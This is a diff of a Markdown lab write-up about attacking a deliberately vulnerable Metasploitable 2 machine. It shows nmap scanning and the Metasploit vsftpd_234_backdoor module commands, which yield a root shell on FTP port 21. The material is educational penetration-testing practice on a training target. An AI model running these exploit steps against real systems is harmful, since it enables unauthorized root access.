@@ -7,9 +7,9 @@
 ________________________________________
 ## Scope & Objectives
 ## Scope:
- **•	Target machine: Metasploitable 2 (IP: 192.168.235.132)**
-  **•	Attacker machine: Kali Linux**
- **•	Exploited service: vsFTPd 2.3.4 (Port 21)**
+**•	Target machine: Metasploitable 2 (IP: 192.168.235.132)**
+**•	Attacker machine: Kali Linux**
+**•	Exploited service: vsFTPd 2.3.4 (Port 21)**
 ## Objectives:
  **1.	Identify vulnerabilities in the target system.**
  **2.	Exploit vsFTPd 2.3.4 backdoor vulnerability.**
@@ -19,7 +19,7 @@ ________________________________________
 ## Exploitation Process
  **Information Gathering**
   **Using Nmap to scan open ports and services:**
- ## **```nmap -sV -A <target-IP>```**
+  **````nmap -sV -A <target-IP>````**
 ![image](https://github.com/user-attachments/assets/cd504c33-0559-4eab-b88e-43dcbd42d438)
 ![image](https://github.com/user-attachments/assets/678a6291-4f8d-4c19-9fa7-457af37648c6)
 ![image](https://github.com/user-attachments/assets/9ed00286-e1b9-4230-8976-99e91c5eb220)
@@ -31,12 +31,12 @@ ________________________________________
  **Findings: Port 21 (FTP) running vsFTPd 2.3.4, a vulnerable version.**
  **Exploitation with Metasploit**
  **1.Launch Metasploit:**
- ## **```msfconsole```**
+  **```msfconsole```**
 ![image](https://github.com/user-attachments/assets/e5c5780d-df07-4268-bd26-7a1f4e1f6e60)
  **2.Use the exploit:**
- ## **```exploit/unix/ftp/vsftpd_234_backdoor```** ,
- ## **```set RHOSTS <target-IP>```**  
- ## **```exploit```**
+ **```exploit/unix/ftp/vsftpd_234_backdoor```** ,
+ **```set RHOSTS <target-IP>```**  
+ **```exploit```**
 ![image](https://github.com/user-attachments/assets/23d873f3-4449-43e0-9af4-00a8fb964ab9)
  **Successful shell access obtained:[+] UID: uid=0(root) gid=0(root)  ,  [*] Command shell session 1 opened**
  ![image](https://github.com/user-attachments/assets/08335b89-439f-4c55-83e7-688ff5b73835)
